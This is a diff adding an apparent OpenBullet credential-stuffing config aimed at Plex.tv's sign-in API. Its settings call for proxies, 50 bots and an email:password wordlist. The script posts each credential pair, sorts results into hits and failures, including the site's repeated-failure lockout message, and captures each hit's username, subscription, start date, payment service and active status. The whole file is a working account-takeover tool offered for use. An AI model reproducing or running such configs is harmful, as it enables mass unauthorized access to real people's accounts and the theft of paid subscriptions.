@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Plex.tv by matt",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-31T15:25:48.453969+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://plex.tv/api/v2/users/signin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<HEADERS(X-Request-Id)>" LR "" "" -> VAR "Token" 
+
+#Login REQUEST POST "https://plex.tv/api/v2/users/signin" 
+  CONTENT "email=<USER>&login=<USER>&password=<PASS>&includeProviders=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Plex-Client-Identifier: <Token>" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "username=\"" 
+    KEY "subscriptionDescription=\"" 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+    KEY "User could not be authenticated. This IP appears to be having trouble signing in to an account (detected repeated failures)\"" 
+    KEY "X-Plex-Client-Identifier is missing" 
+
+#Username PARSE "<SOURCE>" LR "username=\"" "\" title=\"" -> CAP "Username" 
+
+#Subscribtion PARSE "<SOURCE>" LR "subscriptionDescription=\"" "\"" -> CAP "Subscription" 
+
+#Subscribet_At PARSE "<SOURCE>" LR "subscribedAt=\"" "\"" -> CAP "Subscribed since" 
+
+#Payment PARSE "<SOURCE>" LR " paymentService=\"" "\"" -> VAR "Payment" 
+
+#ToUpper FUNCTION ToUppercase "<Payment>" -> CAP "Payment" 
+
+#Active PARSE "<SOURCE>" LR "status=\"" "\"" -> CAP "Status" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "<Status>" Contains "Active" 
+    KEY "<Status>" DoesNotContain "Inactive" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Status>" Contains "Inactive" 
+    KEY "<Status>" DoesNotContain "Active" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<Status>" DoesNotContain "Active" 
+    KEY "<Status>" DoesNotContain "Inactive" 
+
